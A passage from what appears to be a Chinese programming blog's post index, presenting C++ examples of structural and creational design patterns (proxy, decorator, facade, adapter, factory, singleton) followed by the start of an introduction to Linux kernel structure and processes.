new USAShopping; Shopping *overseaProxy = new OverseasProxy(usaShopping); overseaProxy-&gt;buy(&amp;it1); overseaProxy-&gt;buy(&amp;it2); return 0;&#125; 代理模式的种类远程代理（Remote Proxy）为一个位于不同的地址空间的对象提供一个本地的代理对象，这个不同的地址空间可以是在同一台主机中，也可以是在另外一台主机中，远程代理又称为大使（Ambassador）。 远程代理： 使得客户端程序可以访问在远程主机上的对象，远程主机可能具有更好的计算性能与处理速度，可以快速相应并处理客户端的请求。远程代理可以将网络的细节隐藏起来，使得客户端不必考虑网络的存在。客户端完全可以认为被代理的远程业务对象是在本地而不是在远程，而远程代理对象承担了大部分的网络通信工作，并负责对远程业务方法的调用。 如图所示: 客户端对象不能直接访问远程主机中的业务对象，只能采取间接访问的方式。远程业务对象在本地主机中有一个代理对象，该代理对象负责对远程业务对象的访问和网络通信，它对于客户端对象而言是透明的。客户端无须关心实现具体业务的是谁，只需要按照服务接口所定义的方式直接与本地主机中的代理对象交互即可。 在基于.NET平台的分布式技术，例如DCOM（Distribute Component Object Mdoel， 分布式组件对象模型）、Web Service中，都应用了远程代理模式。 虚拟代理（Virtual Proxy）如果需要创建一个资源消耗巨大的对象，先创建一个消耗相对较小的对象来表示，真实对象只在需要时才会被真正创建。虚拟代理(Virtual Proxy)也是一种常用的代理模式，对于一些占用系统资源较多或者加载时间较长的对象，可以给这些对象提供一个虚拟代理。在真实对象创建成功之前虚拟代理扮演真实对象的替身，而当真实对象创建之后，虚拟代理将用户的请求转发给真实对象。 通常，在以下两种情况下可以考虑使用虚拟代理： (1) 由于对象本身的复杂性或者网络等原因导致一个对象需要较长的加载时间，此时可以用一个加载时间相对较短的代理对象来代表真实对象。通常在实现时可以结合多线程技术，一个线程用于显示代理对象，其他线程用于加载真实对象。这种虚拟代理模式可以应用在程序启动的时候，由于创建代理对象在时间和处理复杂度上要少于创建真实对象，因此，在程序启动时，可以用代理对象代替真实对象初始化，大大加速了系统的启动时间。当需要使用真实对象时，再通过代理对象来引用，而此时真实对象可能已经成功加载完毕，可以缩短用户的等待时间。 (2) 当一个对象的加载十分耗费系统资源的时候，也非常适合使用虚拟代理。虚拟代理可以让那些占用大量内存或处理起来非常复杂的对象推迟到使用它们的时候才创建，而在此之前用一个相对来说占用资源较少的代理对象来代表真实对象，再通过代理对象来引用真实对象。为了节省内存，在第一次引用真实对象时再创建对象，并且该对象可被多次重用，在以后每次访问时需要检测所需对象是否已经被创建，因此在访问该对象时需要进行存在性检测，这需要消耗一定的系统时间，但是可以节省内存空间，这是一种用时间换取空间的做法。 无论是以上哪种情况，虚拟代理都是用一个“虚假”的代理对象来代表真实对象，通过代理对象来间接引用真实对象，可以在一定程度上提高系统的性能。 保护代理（Protect Proxy）控制对一个对象的访问，可以给不同的用户提供不同级别的使用权限 缓冲代理（Cache Proxy）为某一个目标操作的结果提供临时的存储空间，以便多个客户端可以共享这些结果 缓冲代理(Cache Proxy)也是一种较为常用的代理模式，它为某一个操作的结果提供临时的缓存存储空间，以便在后续使用中能够共享这些结果，从而可以避免某些方法的重复执行，优化系统性能。 智能引用代理（Smart Reference Proxy）当一个对象被引用时，提供一些额外的操作，例如将对象被调用的次数记录下来等。 装饰模式 装饰模式（decorator Pattern）: 动态地给一个对象增加一些额外的职责，就增加对象功能来说，装饰模式比生成子类实现更为灵活。装饰模式是一种对象结构型模式。 案例 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146// 装饰模式.cpp : 定义控制台应用程序的入口点。#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 一个抽象的构件，他是具体构件和抽象装饰类的父类 class Phone&#123;public: virtual void Show() = 0;protected:private:&#125;;// 具体的构件class iPhone : public Phone&#123;public: iPhone(string kind) &#123; this-&gt;kind = kind; &#125; virtual void Show() &#123; cout &lt;&lt; &quot;秀出了 iPhone- &quot; &lt;&lt; kind &lt;&lt; &quot;:&quot; &lt;&lt; endl; &#125;protected:private: string kind;&#125;;// 具体的构件class Mi : public Phone&#123;public: Mi(string kind) &#123; this-&gt;kind = kind; &#125; virtual void Show() &#123; cout &lt;&lt; &quot;秀出了 Mi-&quot; &lt;&lt; kind &lt;&lt; &quot;:&quot; &lt;&lt; endl; &#125;protected:private: string kind;&#125;;// 抽象的手机装饰类，必须包含抽象的构件class DeCoratorPhone : public Phone&#123;public: DeCoratorPhone() &#123; &#125; DeCoratorPhone(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); &#125;protected:private: Phone *phone;&#125;;// 具体的装饰器class DeCoratorPhoneMo : public DeCoratorPhone &#123;public: DeCoratorPhoneMo(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); addMo(); &#125; void addMo() &#123; cout &lt;&lt; &quot;装饰: 手机贴膜&quot; &lt;&lt; endl; &#125;private: Phone *phone;&#125;;// 具体的装饰器class DeCoratorPhoneKe : public DeCoratorPhone &#123;public: DeCoratorPhoneKe(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); addMo(); &#125; void addMo() &#123; cout &lt;&lt; &quot;装饰: 手机装保护壳&quot; &lt;&lt; endl; &#125;private: Phone *phone;&#125;;int main()&#123; Phone *phone = NULL; DeCoratorPhone * hasMoPhone = NULL; DeCoratorPhone * hasKePhone = NULL; DeCoratorPhone * hasMoKePhone = NULL; // 定义一个Iphone 13手机 phone = new iPhone(&quot;iPhone 13&quot;); // 给普通iphone 加上贴膜 hasMoPhone = new DeCoratorPhoneMo(phone); // 给普通iphone 加上保护套 hasKePhone = new DeCoratorPhoneKe(phone); hasMoPhone-&gt;Show(); hasKePhone-&gt;Show(); // 给有皮套的iphone 加上贴膜 hasMoKePhone = new DeCoratorPhoneMo(hasKePhone); hasMoKePhone-&gt;Show(); delete hasMoKePhone; delete hasKePhone; delete hasMoPhone; delete phone; cout &lt;&lt; &quot;---------------------------------------&quot; &lt;&lt; endl; phone = new Mi(&quot;Mix 4&quot;); hasMoPhone = new DeCoratorPhoneMo(phone); hasKePhone = new DeCoratorPhoneKe(phone); hasMoPhone-&gt;Show(); hasKePhone-&gt;Show(); hasMoKePhone = new DeCoratorPhoneKe(hasKePhone); hasMoKePhone-&gt;Show(); delete hasMoKePhone; delete hasKePhone; delete hasMoPhone; delete phone; return 0;&#125; 输出： 秀出了 iPhone- iPhone 13: 装饰: 手机贴膜 秀出了 iPhone- iPhone 13: 装饰: 手机装保护壳 秀出了 iPhone- iPhone 13: 装饰: 手机装保护壳 装饰: 手机贴膜 秀出了 Mi-Mix 4: 装饰: 手机贴膜 秀出了 Mi-Mix 4: 装饰: 手机装保护壳 秀出了 Mi-Mix 4: 装饰: 手机装保护壳 装饰: 手机装保护壳 请按任意键继续. . . ## 装饰模式的优缺点 优点 对于扩展一个对象的功能，装饰模式比继承更加灵活，不会导致类的个数急剧增加。 可以通过一种动态的方式来扩展一个对象的功能，从而实现不同的行为。 可以对一个对象进行多次装饰。 具体构件类与具体装饰类可以独立变化，用户可以根据需要增加新的具体构件类和具体装饰类，原有类库代码无需改变，符合“开闭原则”。 缺点 使用装饰模式进行系统设计时产生很多小对象，大量小对象的产生势必会占用更多的系统资源，影响程序的性能。 适用场景 动态、透明的方式给耽搁对象添加职责 当不能采用继承的方式对系统进行扩展或者采用继承不利于系统扩展和维护时可以使用装饰模式。 装饰器模式关注于在一个对象上动态的添加方法。然而代理模式关注于控制对象的访问。换句话说，用代理模式，代理类（proxy class）可以对它的客户隐藏一个对象的具体信息。因此，当使用代理模式的时候，我们常常在一个代理类中创建一个对象的实例。并且，当我们使用装饰器模式的时候，我们通常的做法是将院士对象作为一个参数创给装饰者的构造器。 外观模式根据迪米特法则，如果两个类不必彼此直接通信，那么两个类就不应当发生直接的相互作用。 一个对象应当对其他对象尽可能少的了解，从而降低各个对象之间的耦合，提高系统的可维护性。 例如在一个程序中，各个模块之间相互调用时，通常会提供一个统一的接口来实现。这样其他模块不需要了解另外一个木块的内部实现细节，当一个模块内部的实现发生改变是，不会影响其他模块的使用。（黑盒原理）。 Facade模式也叫外观模式。是有GoF提出的23中设计模式中的一种。Facade模式为一组具有类似功能的类群，比如类库、子系统等等，提供一个一致的简单的界面。这个一致的简单的界面被称作facade。 Facade(外观角色): 为调用方，定义简单的调用接口 SubSystem(子系统角色): 功能提供者。指提供功能的类群（模块或子系统）。 更加具体的理解直接看代码就能明白。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// 外观模式.cpp : 定义控制台应用程序的入口点。///* 外观模式就是将复杂的子类系统抽象到同一个的接口进行管理 外界只需要通过此接口与子类系统进行交互，而不必直接与复杂的子类系统进行交互。*/#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;// 这里定义四个字了系统class SubSystem1&#123;public: void Methor1() &#123; cout &lt;&lt; &quot;子系统方法一&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem2&#123;public: void Methor2() &#123; cout &lt;&lt; &quot;子系统方法二&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem3&#123;public: void Methor3() &#123; cout &lt;&lt; &quot;子系统方法三&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class SubSystem4&#123;public: void Methor4() &#123; cout &lt;&lt; &quot;子系统方法四&quot; &lt;&lt; endl; &#125;protected:private:&#125;;/* 外观类，接口 */class Facade&#123;public: Facade() &#123; one = new SubSystem1; two = new SubSystem2; three = new SubSystem3; four = new SubSystem4; &#125; ~Facade() &#123; delete one; delete two; delete three; delete four; &#125; void MethorA() &#123; cout &lt;&lt; &quot;方法组A()&quot; &lt;&lt; endl; one-&gt;Methor1(); two-&gt;Methor2(); &#125; void MethorB() &#123; cout &lt;&lt; &quot;方法组B()&quot; &lt;&lt; endl; three-&gt;Methor3(); four-&gt;Methor4(); &#125;protected:private: SubSystem1 *one; SubSystem2 *two; SubSystem3 *three; SubSystem4 *four;&#125;;int main()&#123; Facade facade; facade.MethorA(); facade.MethorB(); return 0;&#125; 输出： 方法组A() 子系统方法一 子系统方法二 方法组B() 子系统方法三 子系统方法四 请按任意键继续. . . 案例 外观模式较为简单，实现上述模式依次实现电视、灯、音响、麦克风、DVD、游戏机即可，在此基础上实现外观类Facade（家庭影院）即可。 外观模式的优缺点优点 他对客户端屏蔽了子系统组件，减少了客户端所需处理的对象数目，并使得子系统使用起来更加容易。通过引入外观模式，客户端代码将变得很简单，预支关联的对象也很少。 它实现了子系统与客户端之间的松耦合关系，这使得子系统的变化不会影响到调用它的客户端，只需要调整外观类即可。 一个子系统的修改对其他子系统没有任何影响。 缺点 不能很好地限制客户端直接使用子系统类，如果对客户端访问子系统类做太多的限制则减少了可变性和灵活性。 如果设计不当，增加新的子系统可能需要修改外观类的源代码，违背了开闭原则。 适用场景 复杂系统需要简单入口使用。 客户端程序与多个子系统之间存在很大的依赖性。 在层次化结构中，可以使用外观模式定义系统中每一层的入口，层与层之间不直接产生联系，而通过外观类建立联系，降低层之间的耦合度。 适配器模式 将一个类的接口转换成客户希望的另外一个接口。使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。 适配器模式中的角色和职责 Target（目标抽象类）：目标抽象类定义客户所需接口，可以使一个抽象类或接口，也可以是具体类。 Adapter（适配器类）：适配器可以调用另一个接口，作为一个转换器，对Adaptee和Target进行适配，适配器类是适配器模式的核心，在对象适配器中，他通过继承Target并关联一个Adaptee对象使二者产生联系。 Adaptee（适配者类）：适配者即被适配的角色，它定义了一个已经存在的接口，这个接口需要适配，适配者类一般是一个具体类，包含了客户希望使用的业务方法，在某些情况下可能没有适配者类的源代码。 根据对象适配器模式结构图，在对象适配器中，客户端需要调用request()方法，而适配者类Adaptee没有该方法，但是它所提供的SpecificRequest()方法确实客户端所需要的。为了是客户端能够使用适配者类，需要提供一个包装类Adapter，即适配器类。这个包装类包装了一个适配者的实例，从而将客户端与适配者衔接起来，在适配器的Request()方法中调用适配者的SpecificRequest()方法。因为适配器类与适配者类是关联关系（也可称之为委派关系），所以这种适配器模式称为对象适配器模式。 案例 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// 适配器模式.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// targetclass V5&#123;public: virtual void uesV5() = 0;private:&#125;;class V220 &#123;public: virtual void useV220() &#123; cout &lt;&lt; &quot;用220V电压进行充电&quot; &lt;&lt; endl; &#125;&#125;;// Adapter 充电器class ChargerAdapter : public V5&#123;public: virtual void uesV5() &#123; cout &lt;&lt; &quot;充电器对电压进行适配&quot; &lt;&lt; endl; m_p220V.useV220(); &#125;protected:private: V220 m_p220V;&#125;;class Phone&#123;public: Phone() &#123; v5Adapter = new ChargerAdapter; &#125; ~Phone() &#123; if (v5Adapter != NULL) &#123; delete v5Adapter; v5Adapter = NULL; &#125; &#125; void charge() &#123; cout &lt;&lt; &quot;手机进行充电&quot; &lt;&lt; endl; v5Adapter-&gt;uesV5(); &#125;private: // 5v 手机充电器 V5 *v5Adapter;&#125;;int main()&#123; Phone iphone; iphone.charge(); return 0;&#125; 输出： 手机进行充电 充电器对电压进行适配 用220V电压进行充电 请按任意键继续. . . 适配器模式的优缺点优点 将目标类和适配者类解耦。通过引入一个适配器类来重用现有的适配者类，无需修改原有结构。 增加了类的透明性和复用性。将具体的业务实现过程封装在适配者类中，对于客户端类而言是透明的，而且提高了适配者的复用性，同一个适配者类可以在多个不同的系统中复用。 灵活性和扩展性都非常好。可以很方便地更换适配器，也可以在不修改原有代码的基础上增加新的适配器类，完全符合“开闭原则”。 缺点 适配器中置换适配者类的某些方法比较麻烦。 适应场景 系统需要使用一些现有的类，而这些类的接口（如方法名）不符合系统的需要，甚至没有这些类的源代码。 想创建一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作。 到此，设计模式之结构型模式。over~~~😀🌝","tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_设计模式","slug":"A-内功/B-设计模式","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"设计模式之创建型模式","date":"2023-12-25T01:28:27.242Z","path":"A_内功/B_设计模式/创建型模式/","text":"设计模式 学习笔记之C++设计模式——创建型模式 📑 设计模式之结构型模式 📑 设计模式之行为型模式 一、工厂模式简单工厂模式代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;/* 定义一个水果抽象类。供具体水果实现，和工厂使用*/class Fruit &#123;public: virtual void getName() = 0;&#125;;class Apple : public Fruit&#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;我是苹果&quot; &lt;&lt; endl; &#125;&#125;;class Banana : public Fruit &#123;public: virtual void getName()&#123; cout &lt;&lt; &quot;我是香蕉&quot; &lt;&lt; endl; &#125;&#125;;//抽象的工厂类class AbstractFactory&#123;public: virtual Fruit * createFruit() = 0;&#125;;//通过具体的某一产品的工厂生产某种产品class AppleFactory : public AbstractFactory &#123;public: virtual Fruit * createFruit() &#123; return new Apple; &#125;&#125;;class BananaFactory : public AbstractFactory&#123;public: virtual Fruit * createFruit() &#123; return new Banana; &#125;&#125;;int main()&#123; //来一个香蕉工厂 AbstractFactory * bananaFactory = new BananaFactory; //给我来一个水果 Fruit * banana = bananaFactory-&gt;createFruit(); banana-&gt;getName(); delete bananaFactory; delete banana; AbstractFactory * appleFactory = new AppleFactory; Fruit * apple = appleFactory-&gt;createFruit; apple-&gt;getName(); system(&quot;pause&quot;); return 0;&#125; 类图 工厂模式的优缺点优点 不需要记住具体类名，甚至连具体参数都不用记忆。 实现了对象创建和使用的分离。 系统的可扩展性也就变得个非常好，无需修改接口和原类。 缺点 增加系统中类的个数，复杂度和理解度增加。 增加了系统的抽象性和理解难度。 二、抽象工厂模式 工厂方法模式通过引入工厂等级结构,解决了简单工厂模式中工厂类职责太重的问题,但由于工厂方法模式中的每个工厂只生产-产品，可能会导致系统中存在大量的工厂类,势必会增加系统的开销。此时,我们可以考虑将一些相关的产品组成一个”产品族”, 由同-个工厂来统-生产,这就是我们本文将要学习的抽象工厂模式的基本思想。 图例 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;iostream&gt;#include &quot;main.h&quot;using namespace std;//抽象产品类 供具体产地产品实现class AbstractApple &#123;public: virtual void getName() = 0;&#125;;class AbstractBanana &#123;public: virtual void getName() = 0;&#125;;class AbstractPear &#123;public: virtual void getName() = 0;&#125;;class USAApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;美国苹果&quot; &lt;&lt; endl; &#125;&#125;;class ChinaApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;中国苹果&quot; &lt;&lt; endl; &#125;&#125;;class JapanApple : public AbstractApple &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;日本苹果&quot; &lt;&lt; endl; &#125;&#125;;class USABanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;美国香蕉&quot; &lt;&lt; endl; &#125;&#125;;class ChinaBanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;中国香蕉&quot; &lt;&lt; endl; &#125;&#125;;class JapanBanana : public AbstractBanana &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;日本香蕉&quot; &lt;&lt; endl; &#125;&#125;;class USAPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;美国鸭梨&quot; &lt;&lt; endl; &#125;&#125;;class ChinaPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;中国鸭梨&quot; &lt;&lt; endl; &#125;&#125;;class JapanPear : public AbstractPear &#123;public: virtual void getName() &#123; cout &lt;&lt; &quot;日本鸭梨&quot; &lt;&lt; endl; &#125;&#125;;//抽象的工厂类，供具体产品族的实现class AbstractFactory &#123;public: virtual AbstractApple * creatApple() = 0; virtual AbstractBanana * creatBanana() = 0; virtual AbstractPear * creatPear() = 0;&#125;;//具体的工厂class USAFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new USAApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new USABanana; &#125; virtual AbstractPear * creatPear() &#123; return new USAPear; &#125;&#125;;class ChinaFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new ChinaApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new ChinaBanana; &#125; virtual AbstractPear * creatPear() &#123; return new ChinaPear; &#125;&#125;;class JapanFactory : public AbstractFactory &#123;public: virtual AbstractApple * creatApple() &#123; return new JapanApple; &#125; virtual AbstractBanana * creatBanana() &#123; return new JapanBanana; &#125; virtual AbstractPear * creatPear() &#123; return new JapanPear; &#125;&#125;;int main()&#123; //现在要准备一个 中国的苹果，中国的香蕉 AbstractApple *AA = NULL; AbstractBanana *AB = NULL; AbstractPear *AP = NULL; AbstractFactory *factory = NULL; factory = new ChinaFactory; //中国的苹果 AA = factory-&gt;creatApple(); //中国的香蕉 AB = factory-&gt;creatBanana(); AP = factory-&gt;creatPear(); AA-&gt;getName(); AB-&gt;getName(); AP-&gt;getName(); delete AA; delete AB; delete AP; delete factory; system(&quot;pause&quot;); return 0;&#125; 抽象工厂模式不符合“开闭原则” 抽象工厂模式的优缺点优点： 拥有工厂方法模式的优点 当一个产品族中的多个对象被设计成一起工作时，它能够保证客户端始终只使用同一个产品族中的对象 增加新的产品族很方便，无需修改已有系统，符合“开闭原则”。 缺点： 增加新的产品结构麻烦，需要对原有系统进行较大的修改，甚至需要修改抽象层代码，带来较大的不便，违背了“开闭原则”。 抽象模式的应用：可以自己写一个计算机产品相关 简单工厂模式 + “开闭原则” &#x3D; 工厂方法模式 工厂方法模式 + “产品族” &#x3D; 抽象工厂模式 简单工厂模式（规模较小的模型） 工厂方法模式（中等） 抽象工厂模式（复杂的） 借鉴了《Easy搞定设计模式》 三 单例模式 保证一个类、只有一个实例存在，同时提供能对该实例加以访问的的全局访问方法。 三个要点：一是某个类只能有一个实例； 二是它必须自行创建这个实例； 三是它必须自行向整个系统提供这个实例。 角色和职责Singleton（单例）：在单例类的内部实现只生成一个实例，同时是他提供一个静态的getInstance()方法，让客户可以访问他的唯一实例；为了防止在外部对其实例化，将其构造函数设计为私有；在单例类内部定义了一个Singleton类型的静态对象，作为外部共享的唯一实例。 单例模式的使用步骤 构造函数私有化 提供一个全局的静态方法（全局访问点） 来获取单例对象。 在类中定义一个静态指针，指向本类的变量的静态变量指针 饿汉模式理解主要就是为了只让类只有一个实例而把构造函数私有化。定义一个全局的静态实例。 代码123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;/*三个步骤： 1.构造函数私有化（为了不让在类的外部再创建多余的实例） 2.提供一个全局的静态类指针指向唯一实例 3.提供一个全局的静态函数获取实例*/class Singleton &#123;public: // 静态类函数 返回静态实例 static Singleton * getInstance() &#123; return instance; &#125;private: //不让类的外部创建实例 Singleton() &#123; Singleton *single = getInstance(); &#125; Singleton getsingle() &#123; &#125; static Singleton * instance; //指向本类的唯一实例指针&#125;;//静态类变量在类外初始化Singleton*Singleton::instance = new Singleton;int main()&#123; //通过getInstance()获取实例 Singleton * s1 = Singleton::getInstance(); system(&quot;pause&quot;); return 0;&#125; 懒汉模式在程序执行期间再去判断是否需要实例。 1234567891011121314151617181920class Singleton1 &#123;public: //提供一个返回实例的方法 static Singleton1 * getInstance() &#123; // 不确定程序在编译期间是否需要实例 // 如果是多线程下，需要在这里加锁 if (instance1 == NULL) &#123; instance1 = new Singleton1; &#125; // 释放锁 cout &lt;&lt; &quot;Singleton1&quot; &lt;&lt; endl; return instance1; &#125;private: Singleton1() &#123; &#125; static Singleton1 *instance1;&#125;;//懒汉式的初始化方式 饿汉式在初始化时已经指向了singletonSingleton1 * Singleton1::instance1 = NULL; 针对单例模式去判断是否是同一实例 123456Singleton *s1 = Singleton::getinstace();Singleton *s2 = Singleton::getinstace();if (s1 == s2 ) cout &lt;&lt; &quot;s1 == s2&quot; &lt;&lt; endl;else cout &lt;&lt; &quot;s1 != s2&quot; &lt;&lt; endl; 单例模式的应用——打印机用单例模式实现一个打印机程序，用以记录打印的次数和内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;class Printer &#123;public: static Printer * getinstance() &#123; return instance; &#125; void print(string text) &#123; cout &lt;&lt; &quot;打印的内容为：&quot; &lt;&lt; text &lt;&lt; endl; sequence++; cout &lt;&lt; &quot;打印机今天使用了&quot; &lt;&lt; sequence &lt;&lt; &quot;次&quot; &lt;&lt; endl; &#125; static int getSequence() &#123; return sequence; &#125;private: // 定义一个类去析构单例 class Garbo &#123; private: ~Garbo() &#123; if (instance != NULL) &#123; delete instance; &#125; &#125; &#125;; static Garbo garbo; // 在静态区域开辟一个对象，Garbo static int sequence; static Printer * instance;&#125;;int Printer::sequence = 0;Printer *Printer::instance = new Printer;Printer::Garbo Printer::garbo;int main()&#123; //三个peple使用打印机 Printer * p1 = Printer::getinstance(); p1-&gt;print(&quot;亿封简历&quot;); Printer *p2 = Printer::getinstance(); p2-&gt;print(&quot;一份工作汇报&quot;); Printer *p3 = Printer::getinstance(); p3-&gt;print(&quot;离职申请&quot;); system(&quot;pause&quot;); return 0;&#125; 以上就是几种常见的创建型设计模式。","tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_设计模式","slug":"A-内功/B-设计模式","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"【原理剖析】Linux内核及进程概述","date":"2023-12-25T01:28:27.210Z","path":"A_OS/Linux/Linux操作系统原理剖析/2-Linux内核及进程介绍/","text":"概述：本章知识点 Linux 内核结构 Linux 进程概述 Linux 系统对进程的创建、切换、结束操作 0x01 Linux 内核概述事实上，在 Linux 操作系统中设计到真正的操作系统的功能部分其实都是放在 Linux 内核中的。Linux 内核其实就是 Linux 操作系统中最重要的部分。Linux 内核是硬件和软件之间的中间层，将应用程序的请求传递给硬件并充当底层驱动程序，对系统中的各个设备和组件进行寻址等等一些了功能。 目前，对于 Linux 内核的研究主要分为以下三部分功能： 内核的硬件设备管理功能：从应用程序的角度来说，内核可以被认为是一台被抽象的计算机。当内核寻址硬盘，必须确定使用哪个路径能够从硬盘上将数据读取到内存中，这其中涉及到的数据位置、路径及读取数据的指令都是由内核完成的，而对于上层应用程序仅仅需要调用内核的一个接口函数即可完成。从某方面来说，应用程序与硬件本身没有联系，仅仅与内核有联系，内核是应用程序所知道的层次结构中最底。 内核的进程管理功能：当若干应用程序在系统中同时运行时，Linux 内核又需要充当资源管理程序，将可用共享资源（ CPU 时间、磁盘空间、网络连接等等）合理分配给各个系统进程使用，同时还能保证系统的完整性。 内核面向系统接口功能：Linux 内核会面向系统提供一系列的接口函数供应用程序来调用。应用程序通过调用 Linux 内核的一系列系统接口能够使得 Linux 系统帮助应用程序完成一系列功能。 另外，为了更简单理解 Linux 操作系统的功能原理，我们选择早期版本的 Linux 内核作为代码参考，这样可能有效避免很多代码结构优化的代码内容的干扰。目前主流研究 Linux 内核的早期版本都选择的是 Linux 0.12 版本，因为这一版本的整体代码量大约仅有 2 万行，并且在这一版本中的 Linux 内核的大部分主要功能已经都齐全了，后期的 Linux 内核主要完善各个功能协调、硬件适配、平台适配等等方面（最新的 Linux 6.1 版本代码量已经突破 2700 万行） Linux 内核对于操作系统来说其实是单内核模式，这样对于操作系统所提供的服务流程主要为：应用主程序使用指定的参数值执行系统调用指令（ int 0x80 )，使得 CPU 从用户态切换到了内核态，然后操作系统根据具体的参数值调用特定的服务程序，而这些服务程序在完成了对应的执行操作后，操作系统再次使得 CPU 从内核态切换回到用户态，从而返回到应用程序中继续执行。因此，可以将 Linux 内核简单概括为三个层次：调用服务程序的主程序层、执行系统调用的服务层和支持系统调用的底层函数。具体如下图所示： 0x02 Linux 内核结构及任务管理功能Linux 内核其实主要由 5 个模块构成，分别是： 进程调度模块 内存管理模块 文件系统模块 进程间通信模块 网络接口模块 这几个模块之间的依赖关系如下图所示： 由上图能够看出来，所有的模块都与进程调度模块存在依赖关系。因为它们都需要依靠进程调度模块完成程序的挂起（暂停）或者进行运行的状态管理。通常，一个模块会在等待硬件操作期间挂起，在操作完成过后继续执行。 结合 Linux 0.12 内核源代码，可以将内核中的主要模块绘制成如下图所示的框图结构： 0x03 进程的定义进程是操作系统中最基本、最重要的概念之一。进程的概念最早是 20 世纪 60 年代初期由 MIT （美国麻省理工学院）研制的 multics 系统和 IBN 的 TSS&#x2F;360 系统中命名的。从那时候开始，操作系统中有了进程的概念： 进程是程序的一次执行 进程是可以和其他进程并发执行的计算 进程就是一个程序在给定活动空间和初始条件下，在一个处理机上的执行过程 进程是程序在一个数据集合上的运行过程，是系统进行资源分配和调度的一个独立单位 进程是动态的、有生命周期的活动。内核可以创建一个进程，最终将由内核终止该进程使其消亡 我们知道程序是由代码经过编译器编译之后称为可执行文件，而进程则是由程序文件执行过程中存在的，具体区别如下： 程序是今天的概念，是可以作为一种软件资源长期保存，而进程是程序的一次执行过程，是动态的概念 进程是一个能够独立运行的单位，能够与其他进程并发执行。进程在程序执行过程中作为资源申请和调度的单位存在，通常的程序是不能够作为独立运行的单位而并发执行的。 程序和进程不存在一一对应的关系。一个程序运行一次便会创造一个进程，多次运行就会创造多个进程。 各个进程在并发执行的过程中产生相互制约的关系，造成各自运行的不可预测，而程序是静态的，不存在这种异步特征。 0x04 进程的特征目前概括，进程具有如下特征： 动态性：进程是进程实体的执行过程。因此，动态性是进程最基本的特性。进行由创建而产生，调度而执行，因得不到资源而挂起执行，因为撤销而消亡，由此可见，进程是有一定的生命周期的。 并发性：这是指多个进程实体，共存于内存中并在一段时间内同时执行。并发性是进程的重要特征，同时也是操作系统的重要特征。 独立性：进程是一个能够独立运行的基本单位，同时也是系统中独立获得资源和调度管理的基本单位。 异步性：进程按照各自独立的、不可预知的速度向前运行，这样的话，多个进程同时运行时是按照异步方式运行。这一特征导致程序执行的不可预测性及不可再现性。因此，在操作系统中必须采取某些措施来保证各个进程之间能够协调运行。 结构特征：从结构上看，进程实体是由程序段、数据段以及进程控制块组成，所以可以简单将这三部分称为进程映像。 0x05 Linux 进程控制前面已经说明了程序是一个可执行的文件，而进程才是一个执行中的程序实例。通过 CPU 时间片轮转的调度方式，在 Linux 操作系统上能够同时运行多个进程。 